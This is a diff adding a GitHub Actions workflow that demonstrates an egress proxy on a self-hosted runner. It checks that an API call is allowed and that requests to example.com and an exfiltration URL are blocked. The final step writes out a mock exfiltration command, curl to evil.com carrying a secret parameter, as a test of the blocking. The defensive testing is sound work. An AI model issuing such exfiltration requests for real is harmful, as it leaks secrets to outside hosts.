@@ -1,0 +1,38 @@
+name: iron-proxy demo
+
+on:
+  workflow_dispatch:
+
+jobs:
+  demo:
+    runs-on: self-hosted
+
+    steps:
+      - name: Checkout repo
+        uses: actions/checkout@v4
+
+      - name: Set up Node.js
+        uses: actions/setup-node@v4
+        with:
+          node-version: "20"
+
+      - name: Allowed request — GitHub API
+        run: curl -s https://api.github.com/zen
+
+      - name: Blocked request — example.com
+        run: |
+          if curl -sf https://example.com/ -o /dev/null; then
+            echo "ERROR: request should have been blocked"
+            exit 1
+          else
+            echo "Blocked as expected"
+          fi
+
+      - name: Blocked request — exfiltration attempt
+        run: |
+          if curl -sf https://evil.com/exfiltrate?secret=hunter2 -o /dev/null; then
+            echo "ERROR: request should have been blocked"
+            exit 1
+          else
+            echo "Blocked as expected"
+          fi
